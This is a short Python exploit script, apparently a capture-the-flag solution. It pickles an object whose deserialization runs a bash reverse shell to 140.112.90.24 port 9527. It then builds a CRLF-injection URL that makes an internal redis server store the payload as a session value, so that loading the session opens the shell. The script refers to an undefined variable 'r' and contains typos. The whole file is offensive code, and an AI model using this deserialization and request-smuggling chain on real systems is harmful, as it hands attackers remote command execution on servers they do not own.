# env = python 3.7.5
import urllib, requests, socket
import os
import pickle, redis

class shell_class(object):
    def __reduce__(self):
        reverse_shell = "bash -c 'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1'"
        return (os.system, (reverse_shell, ))

sh = shell_class()
sh_serial = pickle.dumps(sh)
sh_serial = str(sh_serial)[1:]
sh_serial = urllib.parse.quote(sh_serial)
print(sh_serial)

# send payload
p = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:ffab9582-1ec5-461b-af2e-15621b9b4d67" ' + sh_serial + '%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
print('palyload for hackbar [  url=%s  ]' % (p))
print('visit [  %s  ] in broewer with session ID NOT EQUAL [  %s  ] for reverse shell' % (r.text, "session:ffab9582-1ec5-461b-af2e-15621b9b4d67"))